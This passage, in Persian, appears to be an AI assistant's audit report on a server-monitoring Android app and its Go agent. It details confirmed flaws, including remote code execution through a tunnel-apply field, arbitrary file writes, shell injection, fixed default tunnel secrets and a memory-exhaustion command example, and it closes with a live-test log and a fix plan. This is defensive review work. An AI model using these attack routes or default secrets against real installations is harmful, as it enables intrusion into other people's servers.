| M1 | `DevLab.kt decodeJwt()` | JWT decoder برای توکن‌های استاندارد base64url شکست می‌خورد (`Base64.DEFAULT` کاراکترهای `-`/`_` را رد می‌کند) | code؛ آزمون ذهنی با توکن نمونه |
| M2 | `DevLab.kt base64Decode()` | decode با خط‌بندی (CRLF رایج در paste) شکست می‌خورد | code |
| M3 | `DevLab.kt minifyJson()` | برای ورودی غیر-JSON، **تمام whitespaceها را حذف می‌کند** (`"hello world"`→`"helloworld"`) — باید error بدهد | code |
| M4 | `UptimeEngine.checkTarget()` | HTTP 3xx = DOWN (redirect → down)؛ KEYWORD کل body را در memory می‌خواند؛ label "PING" درحقیقت TCP connect است؛ type نامعلوم → `isUp=true` (سکوت) | code |
| M5 | `AlertEngine.kt` | cooldown در memory (process death → دوباره alert)؛ شکست ارسال **completely silent** (`catch (_: Exception) {}`)؛ target name بدون escape داخل HTML تلگرام (خروجی `<` → parse fail → silent)؛ دو سیستم cooldown موازی با MonitorService (10min local + 5min remote) | code |
| M6 | `MonitorService.kt` | recovery alert فقط اگر `prevState.error != null` — بعد از process death، Repo خالی است → recovery گم می‌شود؛ هیچ BOOT_COMPLETED/restart خودکار نیست؛ `isRunning` به‌صورت optimistic set می‌شود قبل از تأیید start | code |
| M7 | `Model.kt` / همه‌جا | `id = System.currentTimeMillis()` برای server/tunnel/monitor — collision در ایجاد سریع دو مورد → delete هر دو را حذف می‌کند | code |
| M8 | `ServersScreen.kt` | sparkline با **دادهٔ ساختگی seed** می‌شود: `listOf(m.cpuUsage * 0.85f, m.cpuUsage * 1.1f)` — نمودار اولیه دروغین (نسخهٔ ملایم C5) | code |
| M9 | `DashboardScreen.kt` | "ping" = latency HTTP metrics call است (برچسب گمراه‌کننده)؛ تب‌های Processes/Sockets/Docker **فقط یک‌بار** fetch می‌شوند و stale می‌مانند؛ kill icon در Events 15dp (زیر 44dp minimum touch)؛ **Docker restart/stop بدون dialog تأیید** (عمل مخرب یک‌تپه) | code |
| M10 | `SshEngine.execute()` | output بدون cap — `cat /dev/urandom` → OOM دستگاه؛ در timeout، `exitStatus` = -1 بدون تمایز؛ session تازه per-command (بدون reuse) | code |
| M11 | `SftpEngine.kt` | session/channel تازه برای **هر** عملیات (ls/read/save/rm/chmod — هرکدام handshake کامل)؛ overwrite بدون backup؛ `linkTarget` field هرگز populate نمی‌شود | code |
| M12 | `SshTerminalScreen.kt` | "Terminal" یک terminal نیست: هر command یک exec channel جدید (بدون PTY، بدون state — `cd` ماندگار نیست، readline ندارد)؛ نام‌گذاری گمراه‌کننده | code |
| M13 | `agent/netinfo.go` | `buildInodeMap()` روی **هر** request sockets و هر بار لود status page، کل `/proc/*/fd` را می‌خواند (thousands readlink) — CPU/disk I/O سنگین؛ پاسخ sockets بدون cap (روی سرور پرمحاوره response چند-MB) | code |
| M14 | `agent/tunnel_manager.go queryServiceStatus()` | `systemctl`/`journalctl` بدون timeout — اگر D-Bus hang کند، handler API هم hang می‌کند (server بدون WriteTimeout → goroutine accumulate) | code |
| M15 | `agent/processes.go detectEvents()` | spike detection بدون **sustained condition**: یک نمونهٔ ۲ ثانیه‌ای بالای threshold → event + alert فوری (false positive)؛ cooldownها (60s/5m/10m/30m) فقط تکرار را کم می‌کنند؛ **recovery alert برای CPU/Mem/Disk وجود ندارد** | code |
| M16 | `agent/main.go banner()` | Token در stdout چاپ می‌شود → در journald برای همیشه می‌ماند (`journalctl -u didban-agent`) — روی سرورهای چندکاربره با دسترسی log، نشت اعتباری است | test زنده: خط `Token: testtoken123` در لاگ |
| M17 | `EncryptedVault.kt` | PBKDF2 با 100k تکرار (پیشنهاد OWASP فعلی برای SHA-256: 600k)؛ `password.toCharArray()` هرگز zero نمی‌شود؛ بدون auto-lock (notes رمزگشایی‌شده تا کشتن process در memory می‌مانند) | code |
| M18 | `BackupEngine.kt` | createBackup با `password=null` → **blob plaintext** با همهٔ tokenها — اگر UI پیش‌فرض بدون رمز باشد، یک‌تایپ export = نشت کامل | code |
| M19 | `CloudflareManager.kt` | بدون validation content بر اساس type (A record با content نامعتبر)؛ بدون handling 429/rate-limit؛ خطاها raw JSON CF را به کاربر نشان می‌دهند | code |
| M20 | `CheckHost.kt` + `WorldPortProbeScreen` | وابستگی کامل به check-host.net (SPOF ثالث)؛ polling window ثابت 12×1.5s=18s — nodeهای دیرتر = "timeout"؛ بدون retry | code |
| M21 | همه‌جا | **Dead code:** `AlertType.DISK_SPIKE, SSL_EXPIRING, TUNNEL_DROP, TUNNEL_UP` هرگز dispatch نمی‌شوند (grep کل کد — صفر reference)؛ `latHist` در Dashboard هرگز render نمی‌شود؛ `SftpFileItem.linkTarget` مرده | grep |
| M22 | `agent/` | `gofmt -l` → `docker.go`, `netinfo.go` فرمت‌نشده؛ CI format/vet ندارد | test زنده: خروجی gofmt |
| M23 | `app/build.gradle` | `minifyEnabled false` (بدون R8 — حجم + خوانایی bytecode)؛ **gradle wrapper نیست** (CI با Gradle سیستمی 8.7 — عدم تکرارپذیری) | code |
| M24 | `AndroidManifest.xml` | `usesCleartextTraffic=true` global — هر hostname به HTTP降级 می‌تواند؛ network-security-config برای محدود کردن به `http://<ip>:<port>` بهتر است | code |
| M25 | `DidbanWidgetProvider.kt` | widget فقط countها را نشان می‌دهد؛ uptime% از `lastStatus` (که فقط وقتی tab باز بوده آپدیت شده) — عدد گمراه‌کننده | code |
| M26 | `agent/main.go` | `EnableAlerts` default ON (`!= "0"`) — flag مبهم؛ `DIDBAN_PLAIN` فقط env، flag ندارد | code |

---

## ۶. مسائل اولویت پایین (Low)

| # | محل | مسئله |
|---|------|--------|
| L1 | همه‌جا | Magic numbers: poll 10s/15s/30s، top-25 procs، 500 events، 10080 hist، 75s script timeout، 4MB file limit، 500KB scanner buffer، cooldown 5m/10m — باید config/constant با مستند باشند |
| L2 | UI | **i18n ناقص:** بخش بزرگی از UI انگلیسی‌ست با وجود حالت فارسی (نمونه: "Open Telemetry Dashboard"، "Docker Containers"، "Test Now"، "Interval:"، "Checked:"، "Collecting telemetry…"، "PAUSED"، DevLab labelها، uptime dialog)؛ `strings.xml` عملاً خالی است و localization در `Strings.kt` (interface fa/en) — غیرمعمول ولی کار می‌کند؛ RTL در values جدا نداریم |
| L3 | `agent/api.go handleProcessKill` | شرط `r.Body != nil` همیشه true است |
| L4 | `agent/docker.go` | `idOrName` بدون URL-escape در Sprintf — با token، امکان شکستن URL (severity پایین چون auth لازم دارد) |
| L5 | `agent/tlsutil.go` | `KeyUsageKeyEncipherment` روی کلید ECDSA بی‌معنا (ضرر ندارد) |
| L6 | `agent/status_page.go` | بدون security headers (CSP, X-Content-Type-Options, Referrer-Policy)؛ meta refresh 15s |
| L7 | `agent/processes.go truncate()` | slice روی byte در متن multi-byte ممکن است UTF-8 را بترکاند (JSON با U+FFFD replace می‌شود — کوشا، نه فاجعه) |
| L8 | `agent/status_page.go` | status page عمومی: hostname + نسخهٔ agent + تمام پورت‌های شنونده **با نام process** بدون auth — fingerprinting (تصمیم طراحی است ولی حداقل process name باید optional شود) |
| L9 | `UptimeScreen` | type "HTTPS" در engine پشتیبانی می‌شود ولی در UI گزینه نیست |
| L10 | `README.md` | ادعاهای نادرست: "24/7" (H1)، "QR code downloading" (H6) — مستندات باید با واقعیت هم‌خوان باشد |
| L11 | `agent/api.go` | `/health` اطلاعات `telegram_active` را public می‌دهد (فingerprinting کانال alert) |
| L12 | `Fmt.bytes` | ۰ تا ۱۰۲ → "B" درست است ولی `rate()` tier دومی فقط KB/s/MB/s (GB/s ندارد) |
| L13 | `TunnelScreen` | `syncStatusIran/Foreign` در config persist می‌شود ولی در UI به‌روزرسانی‌شده نمایش نمی‌یابد بعد از restart app (state کهنه) |
| L14 | `agent/main.go` | `firstLocalIP()` روی interface اول — در سرورهای چند-IP، banner ممکن است IP اشتباه نشان بدهد (cosmetic) |

---

## ۷. آسیب‌پذیری‌های امنیتی (تجمیع با severity)

| رتبه | ID | شرح | وضعیت اثبات |
|---|----|------|--------------|
| 1 | C1 | RCE از API (exec_script) | **تست زنده — اثبات شد** |
| 2 | C2 | Arbitrary file write (config_path) | **تست زنده — اثبات شد** |
| 3 | C6 | Shell injection (ufw allow $port) | code (مکانیزم همان C1 است) |
| 4 | C3 | بدون host-key verification SSH (MITM → root password) | code |
| 5 | C4 | secretها plaintext + allowBackup | code |
| 6 | H4 | heredoc/shell injection در اسکریپت‌های تولیدی | code |
| 7 | H5-1 | Token از query param (log leakage) | **تست زنده — 200 با ?token=** |
| 8 | H5 | بدون rate limit/body cap/access log | **تست زنده** (behavior) |
| 9 | M16 | Token در journald ماندگار | **تست زنده** |
| 10 | H13 | بدون verify checksum/GPG برای binary | code |
| 11 | H20 | LocalServer بدون auth روی wildcard | code |
| 12 | M10 | unbounded SSH stdout → DoS/OOM device | code |
| 13 | H14 | TLS downgrade ساکت | code |
| 14 | M17 | KDF/zeroing/auto-lock Vault | code |
| 15 | H10 | الگوریتم‌های کوب‌شده SSH در exec engine | code |

**نکتهٔ طراحی مثبت:** `KillProcess` PID≤1 و self را رد می‌کند؛ auth constant-time است؛ Vault از GCM با nonce تصادفی 96-bit و salt مستقل استفاده می‌کند؛ TLS self-signed با pinning SHA-256 (TOFU) منطق درستی دارد — اما **اولین اتصال بدون pin، هر گواهی‌ای را می‌پذیرد** (TOFU ذاتی است) و UI باید fingerprint را قبل از pin **صریحاً** به کاربر نشان دهد (الان فقط یک banner با دکمهٔ pin — بدون فرایند تأیید out-of-band).

---

## ۸. مشکلات عملکردی (Performance)

### Agent
| مورد | وضعیت |
|---|---|
| sampling (2s/10s/60s) | مناسب و سبک ✓ |
| `sampleProcs` | ۴+ read system call per process هر ۲ ثانیه (stat/statm/cmdline/status) — قابل قبول ولی قابل بهینه (lazy cmdline) |
| **`GetNetworkSockets`** | **سنگین**: scan کامل `/proc/*/fd` در هر request + هر render status page (M13) |
| `GetDockerContainers` | client تازه per call (هر ۱۰s) — قابل قبول ولی pool بهتر است |
| `queryServiceStatus` | ۳ subprocess (systemctl×2 + journalctl) بدون timeout (M14) |
| Memory/leak بعد از ۳۰ روز | goroutine leak دیده نشد؛ **events.jsonl unbounded (H12)**؛ hist capped ✓؛ fd leak دیده نشد |

### اندروید
| مورد | وضعیت |
|---|---|
| **۳ poller موازی** | H7 — بزرگ‌ترین هزینهٔ شبکه/باتری |
| **OkHttpClient per request** | H7 — بدون reuse، thread churn |
| Uptime tab: **Prefs write هر ۱۵ ثانیه** + reassignment list → recomposition کامل | `saveTargets()` داخل حلقه |
| `Repo.states` map با هر server replace می‌شود | چندین recomposition per cycle |
| HorizontalPager ۶ صفحه | صفحات مجاور compose می‌شوند — قابل قبول |
| Sparkline animateFloatAsState | در هر 10s یک آنیمیشن 900ms — OK ولی با fake-seed (M8) بی‌معنا |
| سفت‌پی‌تی: session per operation | M11 |
| Low-end device | ترکیب H7 + polling + JSch per-op روی 2GB RAM قابل‌توجه است |

---

## ۹. مشکلات API

**فهرست کامل endpoints (تأییدشده با تست زنده):**

| Endpoint | Auth | نتیجه تست زنده | مشکل |
|---|---|---|---|
| `GET /health` | — | 200 ✓ | اطلاعات کانال alert نشت می‌کند (L11) |
| `GET/POST /status, /api/status` | — | 200 ✓ | information disclosure (L8) + I/O سنگین (M13) |
| `GET /api/metrics` | token | 200 ✓ / 401 بدون/با توکن غلط ✓ | `network: null` در نمونهٔ اول (app handle می‌کند ✓) |
| `GET /api/processes` | token | 200 ✓ top-25 | بدون `start_time/exec/ppid` (محدودیت feature) |
| `POST /api/processes/kill` | token | 200 + kill واقعی ✓ / 400 بدون pid ✓ / PID1 رد ✓ | `||r.Body!=nil` مرده (L3) |
| `GET /api/network/sockets` | token | 200 ✓ (33 listening/98 conn) | I/O سنگین، بدون cap (M13) |
| `GET /api/docker/containers` | token | 200 ✓ `installed:false` + error | بدون docker.sock → error text (ok) |
| `POST /api/docker/restart|stop` | token | (socket نبود، test نشد) | بدون escape id (L4)؛ **بدون endpoint start** |
| `GET /api/events?limit=` | token | 200 ✓ | بدون pagination/offset |
| `GET /api/history?hours=` | token | 200 ✓ | cap 168h فقط in-memory (H12) |
| `POST /api/tunnel/apply` | token | 200 ✓ / 400 invalid json ✓ | **RCE + file write (C1/C2)**؛ 500 برای validation (H5) |
| `GET /api/tunnel/status?id=` | token | **200 برای id غیرواقعی** ✓ (test) | باید 404 |
| `POST /api/tunnel/delete` | token | **`success:true` برای id غیرواقعی** ✓ (test) | باید 404 + idempotency صریح |
| `POST /api/alerts/test` | token | — | GET هم قبول می‌کند (H5-5) |

**مغایرت قرارداد app↔agent:** شمای JSON در تست زنده با `Model.kt` هم‌خوان بود (هیچ field mismatch پیدا نشد). مغایرت‌های رفتاری: 200/404 (بالا)، `success` vs `active` در پاسخ tunnel (app هر دو را می‌خواند — شکننده).

---

## ۱۰. مشکلات اندروید

1. **Lifecycle (H8, H9):** crash recovery غیرمعتبر؛ state در rotation گم می‌شود؛ بدون ViewModel.
2. **Background (H1, M6):** uptime/monitoring واقعی background نیستند؛ service فقط با toggle دستی start می‌شود و بعد از reboot نمی‌آید بالا (بدون BOOT receiver).
3. **Security (C3, C4, H14, M24):** بدون host-key check؛ plaintext secrets + backup؛ cleartext global.
4. **Networking (H7, M10):** pollers موازی؛ client per request؛ unbounded SSH output.
5. **i18n/RTL (L2):** ترکیب EN/FA در یک صفحه؛ اعداد تلمتری با فونت Telemetry (خوب) ولی labelها مخلوط؛ `strings.xml` تقریباً خالی.
6. **UI (جزئیات):** touch targets کوچک (15–28dp)؛ dialogهای LazyColumn با ارتفاع ثابت 380–400dp (روی صفحهٔ کوچک دکمه‌ها بریده می‌شوند)؛ **بدون confirmation برای Docker stop/restart** (M9)؛ confirmation برای SFTP delete وجود دارد (✓)؛ kill process dialog دارد (✓) ولی icon کوچک.
7. **Manifest (H15, M25):** بدون deep link scheme؛ widget دادهٔ کهنه نشان می‌دهد.
8. **Build (M23):** بدون wrapper، بدون R8، بدون lint/tests در CI.
9. **Permission:** POST_NOTIFICATIONS request می‌شود (✓) — ولی اگر رد شود، alertهای local ساکت می‌شوند بدون هیچ پیام (M5).

---

## ۱۱. مشکلات Agent (جزئی)

1. **امنیت:** C1, C2, H5, M16, M14, M13 (در بالا).
2. **دقت:**
   - CPU `Usage = 100 - idle - iowait` — iowait از "usage" خارج است (انتخاب طراحی؛ در UI باید شفاف باشد).
   - `sampleNet` فقط interfaces با prev-match — interface جدید در نمونهٔ اول ظاهر نمی‌شود (ok).
   - `checkDockerContainers` state را **به نام container** index می‌کند — rename container → false "up" event؛ container حذف‌شده → entry در `dockerState` هرگز پاک نمی‌شود (memory growth کند + false state).
3. **Long-running (پاسخ به "۳۰ روز بعد؟"):**
   - **events.jsonl unbounded** (H12) — تنها رشد واقعی بی‌حد.
   - hist in-memory capped (✓) ولی restart = پاک (شفافیت لازم).
   - `lastDiskEvent` map — تعداد entries = تعداد mount (محدود ✓).
   - `dockerState` map — رشد با rename‌های مکرر (کم).
   - بدون goroutine/fd leak مشاهده‌شده در کد (✓).
4. **جدا از systemd:** Agent بدون systemd هم work می‌کند (✓ flag-based) ولی tunnel manager به systemctl وابسته است.

---

## ۱۲. مشکلات Tunnel Hub

1. **امنیت:** C1, C2, H4 (همه در لایهٔ agent که deploy را اجرا می‌کند).
2. **صحت:**
   - H3 — non-idempotent token/key (redeploy شکست).
   - H16 — server matching با substring.
   - H18 — Narnia ip_forward/fallback.
   - H19 — IPTables بدون validation + تکراری.
   - `generateCode` برای IPTABLES بدون foreignHost → `KHAREJ_IP` literal.
   - Backhaul/Rathole/Chisel/FRP: token پیش‌فرض **ثابت** اگر خالی باشد (`didban_backhaul_secret`, `didban_chisel_secret`, `didban_frp_secret`, `didban_rathole_token`) — دو deploy با token خالی = **token شناخته‌شده عمومی** (M-grade security bug — در H13 هم‌خانواده است؛ در لیست C/H گنجاندم چون predictable default credential است).
3. **عملیاتی:**
   - بدون pre-flight check (آیا پورت آزاد است؟ آیا binary قابل دانلود است؟) — deploy 75s می‌سوزاند و بعد "failed".
   - بدون rollback (config نوشته شد، script شکست → نیمی‌سازگار می‌ماند).
   - بدون health/latency monitoring پیوسته (فقط "test" دستی با TCP connect).
   - `queryServiceStatus` 1 ثانیه بعد از apply — service ممکن است هنوز در حال start باشد → نتیجهٔ ناپایدار.
   - Delete: unit را پاک می‌کند ولی binary نصب‌شده (backpack/frp/...) **نمی‌ماند** (cleanup ناقص) — و همچنین configهای خارج از `/etc/didban/tunnels/*.toml|json|yaml|conf` پاک نمی‌شوند (مثلاً `/etc/backpack/server.toml` که خود اسکریپت‌ها می‌سازند).
4. **Discovery:** `discoverTunnels` با substring روی process name (خطادر)، heuristic "ir" در نام سرور (M16)، token placeholder `"auto-detected"` ذخیره می‌شود (مخالف rule "no placeholder").

---

## ۱۳. مشکلات Monitoring

1. **Agent-side spikes:** بدون sustained condition (M15) → false positive؛ recovery بدون alert؛ thresholdها از env قابل تنظیم نیستند (H13) — فقط flag.
2. **App-side:**
   - H7 — سه poller.
   - M9 — tabها stale.
   - **Server Radar واقعی وجود ندارد** — فقط Check-Host (ping/http/tcp/dns از nodeهای ثالث) و TcpPinger واحد. چیزی شبیه latency matrix چند-مکانی با TLS timing/DNS timing/packet loss/availability **نمی‌شود** (فاز ۲ target).
   - Uptime: H1 + M4 + heartbeat فقط 30 عدد (15 دقیقه تاریخچه) — "SLA" بر اساس 30 sample محاسبه می‌شود.
3. **دقت تلمتری:** `load_avg` فقط load1 در UI؛ swap نمایش نمی‌یابد؛ network فقط rx/tx اولین interface؛ disk فقط "اولی" — درحالی‌که agent همه را می‌فرستد (phase ۲).
4. **Health score / incident correlation:** وجود ندارد — events مستقل‌اند، بدون tie به processes/docker/tunnel events (phase ۲ target).

---

## ۱۴. مشکلات UX (پیش از بازطراحی)

**ساختار ناوبری فعلی:** 5 تب پایین (سرورها/تونل‌ها/آپ‌تایم/شبکه و ابر/گاوصندوق و ابزارها) + overlay جزئیات سرور (6 پagers).

| مسئله | توضیح |
|---|---|
| **اعتمادشکنی** | C5 — سه feature با دادهٔ جعلی. بزرگ‌ترین مشکل UX قبل از هر pixel است. |
| **تنظیمات پراکنده** | poll interval در ServersScreen top-bar؟ alert settings در AlertsHub (داخل VaultTools)؛ CF token در Cloudflare screen؛ backup در BackupRestore؛ زبان/تم در top-bar. **صفحهٔ Settings منسجم نیست.** |
| **i18n مخلوط** | L2 — فارسی با labelهای انگلیسی در یک صفحه (حس "نیمه‌کاره"). |
| **Information density** | Dashboard: 3 ring gauge + 4 stat + chart + 4 tile — ok؛ ولی "worst ping" fleet = latency HTTP agent (نام برعکس). |
| **loading/empty/error states** | EmptyState و LoadingState و BannerCard وجود دارند (✓ خوب)؛ skeleton برای listهای اولیه نیست (مستقیم loading می‌شود). |
| **destructive ops** | Docker stop/restart بدون تأیید (M9)؛ tunnel delete dialog دارد (✓)؛ SFTP delete تأیید دارد (✓)؛ vault note delete؟ (باید با dialog). |
| **touch targets** | 15dp kill icon در events، 28dp icon buttons — زیر استاندارد 44dp. |
| **RTL** | `LayoutDirection` در سطح app switch می‌شود (✓)؛ فونت telemetry لاتین برای اعداد (✓)؛ اما فونت فارسی default system است — تایپوگرافی فارسی در densityهای کم (9.5–10sp) خوانایی ضعیف می‌شود؛ اعداد داخل متن فارسی با Telemetry (لاتین) — consistency لازم دارد. |
| **dark mode** | palette کامل dark دارد (Obsidian)؛ light palette وجود دارد ولی در کد به‌اندازهٔ dark پرداخت نشده (باید با اجرا بررسی شود — در این محیط **غیرقابل تست** است). |
| **onboarding** | guide card در Servers/Uptime (✓ خوب) ولی یک‌بار نیست — هر بار با `servers.isEmpty()` باز است. |
| **اعلانات** | permission رد شود → هیچ feedback دائمی (toast فقط یک‌بار). |
| **performance perceived** | 10s poll با 8s connect timeout → روی شبکهٔ آفلاین، هر 18s+ یک "offline" flash (بدون backoff/optimistic state). |

---

## ۱۵. بدهی فنی (Technical Debt)

| # | شرح |
|---|-----|
| TD1 | بدون test framework در هر دو سمت؛ بدون CI lint/vet/format/security scan |
| TD2 | بدون Gradle wrapper + بدون R8/minify + بدون baseline profile |
| TD3 | `ToolkitScreens.kt` = **3270 خط در یک فایل** (۱۰+ screen)؛ `TunnelEngine.kt` 1638 خط؛ `Ui.kt` 1372 — module‌بندی لازم |
| TD4 | `Repo` object global به‌عنوان state management — بدون owner/lifecycle |
| TD5 | بدون versioning/migration برای schemaهای prefs (`version` field فقط در backup) |
| TD6 | `Locales`/`Strings.kt` (973 خط) به‌جای Android resources — tooling RTL/Lint را از دست می‌دهیم |
| TD7 | magic numbers (L1) |
| TD8 | dead code (M21) + `parseDeepLinkOrLogs` نام‌گذاری گمراه‌کننده |
| TD9 | دو سیستم alert موازی (MonitorService + AlertEngine) با cooldowns مختلف (M5) |
| TD10 | README/DESIGN.md با واقعیت مغایر (L10) |
| TD11 | `agent/go.mod` بدون dependency (✓) ولی بدون license header/test — CI `go vet` ندارد |
| TD12 | hardcoded install URLها به `raw.githubusercontent.com/.../main/...` — break با rename repo/branch؛ باید از release/tag باشد |

---

## ۱۶. تست‌های موجود / فاقد

**وضعیت فعلی: صفر.**
- `find` روی کل ریپازیتوری: **هیچ `_test.go`، هیچ `src/test`، هیچ instrumentation test.**
- CI agent: فقط build 4-arch + release. بدون `go vet`، `gofmt -s`، test، race detector.
- CI android: فقط `assembleRelease`. بدون `lint`، `testDebugUnitTest`، detekt/ktlint.

**پیشنهاد حداقلی برای فاز ۲ (با اولویت):**
1. Go: unit test برای `parseProcStat`، `parsePortMappings` (app-side)، `parseIPv4/6`، `unescapeMount`، `getServiceName`، `EventLog`، `KillProcess` (guard)، integration test API با httptest (auth، 404 tunnel، validation).
2. Go: `go vet` + `gofmt -s` + `go test -race` در CI.
3. Kotlin: unit test برای `DevLabTools` (CIDR/JWT/base64/hash)، `BackupEngine` (round-trip + wrong password + corrupt)، `EncryptedVault` (round-trip + wrong password + tamper)، `parseDeepLinkOrLogs`، `parsePortMappings`، `PortScanner` parse، `SshEngine.cleanAnsi`.
4. CI: `testDebugUnitTest` + `lint` (release) + ktlint.
5. Smoke: script bash برای agent (health/metrics/auth/404) به‌عنوان contract test.

---

## ۱۷. قابلیت‌های ناقص/نیمه‌کاره

| قابلیت | وضعیت |
|---|---|
| **Deep link `didban://`** | لینک تولید می‌شود ولی app آن را handle نمی‌کند (H15) — **نیمه‌کاره** |
| **QR code** | فیک (H6) — **غیرعملکردی** |
| **Bandwidth Benchmark** | سرعت‌ها فیک (C5a) — **غیرقابل اعتماد** |
| **SecurityScreen (banned IPs)** | فیک (C5b) |
| **SystemdScreen (service list)** | فیک جزو logs (C5c) |
| **Uptime 24/7** | فقط foreground-tab (H1) |
| **SSH key auth** | اصلاً وجود ندارد — فقط password (gap بزرگ برای pro DevOps) |
| **Tunnel token persist** | H3 — redeploy شکسته |
| **Recovery alerts (agent)** | فقط process/container؛ CPU/mem/disk recovery نیست (M15) |
| **Docker start** | فقط restart/stop — endpoint start نیست (gap) |
| **Process tree / start time / exe path** | در API نیست (phase ۲) |
| **IPv6 CIDR** | calculator فقط IPv4 (M-grade gap) |
| **Smart-paste از banner** | فقط didban://؛ خروجی raw banner parse نمی‌شود (H15) |
| **Server Radar واقعی** | ندارد — فقط check-host (phase ۲ target) |
| **Public status page "services + incidents + uptime%"** | فقط snapshot لحظه‌ای — history/service/SLA ندارد (phase ۲) |
| **Alert rules engine** | فقط threshold cpu/mem per-server در app + cooldown ثابت agent (phase ۲) |
| **Vault auto-lock / categories / secure copy-protection** | ندارد (phase ۲) |
| **Local server expiration/auth** | ندارد (H20) |

---

## ۱۸. قابلیت‌هایی که نیاز به بازطراحی دارند

1. **Tunnel Hub** — از "generate script + fire" به یک **deployment platform**: pre-flight، idempotency، health score، log stream، rollback، history، node profiles. (بزرگ‌ترین بازطراحی فاز ۲)
2. **Alerting** — از fire-and-forget به **Incident lifecycle** (TRIGGER→INCIDENT→UPDATE→RECOVERY) با dedup/cooldown/escalation/maintenance window.
3. **Server Radar** — از "check-host" به latency matrix چند-مکانی واقعی (DNS/TCP/TLS/HTTP timing + loss + jitter + history).
4. **Docker Manager** — images/volumes/networks/logs/inspect + confirmation + resource usage.
5. **Process Analytics** — ranking + tree + history + suspicious indicators + safe kill flow.
6. **Spike Forensics** — correlation (چه چیزی، کِی، چرا، چه مدت، قبل/بعد) به‌جای لیست events خام.
7. **Navigation/IA** — گروه‌بندی نو (Overview / Servers / Radar / Incidents / Network / Docker / Tunnels / DNS / Security / Vault / Dev Tools / Settings).
8. **Settings** — صفحهٔ منسجم (polling، thresholds، alerts، language/theme، backup/restore، about/security).
9. **Public Status Page** — SaaS-grade (services، SLA، incidents، maintenance، history).
10. **Vault** — categories/tags/search/auto-lock/secure deletion.

---

## پیوست: شواهد تست زنده (Agent در این محیط)

```
go build          → OK (go1.22.5, linux/amd64)
go vet ./...      → clean
gofmt -l .        → docker.go, netinfo.go (نافرمت)
agent run         → OK، banner با Token چاپ شد
GET /health       → 200 (public)
/api/metrics      → 401 بدون توکن | 401 توکن غلط | 200 با توکن | 200 با ?token= (ناامن)
/api/processes    → 200، 25 process با cpu/user درست
/api/events       → 200، agent_restart ثبت‌شده
/api/history      → 200
/api/network/sockets → 200 (33 listening / 98 conn)
/api/docker/containers → 200 {installed:false, error:"docker socket not found"} (درست)
kill SIGTERM      → 200 + process واقعاً کشته شد ✓
kill PID 1        → رد شد ✓ | kill بدون pid → 400 ✓
POST /api/metrics → 405 ✓
tunnel list       → 200 {} ✓
tunnel status (بدون id) → 400 ✓
tunnel status (id غیرواقعی) → 200 "inactive" (باید 404) ⚠
tunnel delete (id غیرواقعی) → {"success":true} (باید 404) ⚠
tunnel apply: config_path خارج → فایل ساخته شد ⚠ (arbitrary write)
tunnel apply: exec_script → echo روی دیسک اجرا شد ⚠⚠ (RCE)
/status           → 200 public با 37 port-chip (information disclosure)
graceful shutdown (SIGTERM) → "shutting down..." ✓
```

**بخش‌هایی که فقط code-review شدند (Rule 1):** کل اپلیکیشن اندروید (بدون SDK/دستگاه)، رفتار systemd H2، اجرای اسکریپت‌های install روی سرور واقعی، UI dark/light و RTL در عمل، battery/CPU واقعی اندروید.

---

## جمع‌بندی و مسیر پیشنهادی

**پیش از هر چیز دیگری (Phase 1.5 — "trust & safety" fixes، قابل انجام در ۱-۲ هفته):**
1. C1/C2: بازطراحی tunnel apply (allowlist + canonical paths) — **بحرانی**
2. C6: validation `port` + argv-based command execution
3. C3: SSH TOFU
4. C4: allowBackup=false + EncryptedSharedPreferences
5. C5a/b/c: حذف یا واقعی‌سازی داده‌های جعلی
6. H1: background uptime
7. H2: اصلاح unit file
8. H5/H13/H14: API hardening + installer verify + TLS downgrade guard
9. H7: single poller + client reuse
10. H6: QR واقعی یا حذف

**سپس Phase 2 (ارتقای قابلیت‌ها)** طبق برنامهٔ کاربر، و در نهایت **Phase 3 (بازطراحی UI از صفر)** — که اکنون با آگاهی کامل از اینکه کدام داده‌ها واقعی‌اند و کدام‌ها نه، شروع شود.

---
**پایان گزارش مرحلهٔ ۱. منتظر تأیید شما برای شروع فاز بعدی هستم.**
